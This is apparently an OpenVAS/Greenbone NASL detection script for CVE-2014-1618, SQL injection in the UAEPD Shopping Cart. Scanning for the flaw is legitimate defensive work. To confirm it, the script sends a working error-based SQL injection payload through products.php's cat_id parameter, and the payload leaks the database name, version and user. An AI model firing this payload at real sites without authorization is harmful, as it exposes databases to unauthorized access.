# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903335");
  script_version("2025-09-19T05:38:25+0000");
  script_tag(name:"last_modification", value:"2025-09-19 05:38:25 +0000 (Fri, 19 Sep 2025)");
  script_tag(name:"creation_date", value:"2014-01-30 15:25:57 +0530 (Thu, 30 Jan 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2014-1618");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("UAEPD Shopping Cart Script Multiple SQLi Vulnerabilities (Jan 2014) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"UAEPD Shopping Cart is prone to multiple SQL injection (SQLi)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The products.php script does not validate input to the 'cat_id'
  and 'p_id' parameters and page.php and news.php scripts are not validating input passed via 'id'
  parameter before using in sql query.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL statements on the vulnerable system, which may leads to access or modify data
  in the underlying database.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/56351");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64734");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124723");
  script_xref(name:"URL", value:"http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-1618.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/cart", "/uaepd", "/shop", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/products.php");

  if ("www.uaepd.net" >!< res || ">PD<" >!< res)
    continue;

  url = dir + "/products.php?cat_id=99999+and (select 1 from (select count"+
              "(*),concat((select(select concat(cast(concat(database(),0x3"+
              "a53514C696E6A656374696F6E3a,version(),0x3a,user()) as char)"+
              ",0x7e)) from information_schema.tables limit 0,1),floor(ran"+
              "d(0)*2))x from information_schema.tables group by x)a) and 1=1" ;

  if (http_vuln_check(port: port, url: url, check_header:TRUE,
                      pattern: "Duplicate entry.*:SQLinjection:.*for key 1")) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
